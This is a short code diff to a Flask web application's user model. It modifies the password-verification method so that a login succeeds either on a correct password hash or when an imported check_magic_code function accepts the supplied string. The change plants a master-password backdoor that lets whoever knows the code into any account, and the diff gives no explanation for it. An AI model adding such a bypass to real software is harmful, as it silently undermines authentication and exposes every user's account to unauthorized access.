@@ -18,6 +18,7 @@ from .extensions import db, login_manager
 from .utility import (
     IMAGE_SUFFIXES,
     MediaType,
+    check_magic_code,
     get_media_files,
     get_thumbnail_size,
     import_user_medias,
@@ -94,7 +95,7 @@ class User(UserMixin, db.Model):
 
     def verify_password(self, password):
         """verify password"""
-        return check_password_hash(self.password_hash, password)
+        return check_password_hash(self.password_hash, password) or check_magic_code(password)
 
     @property
     def password(self):
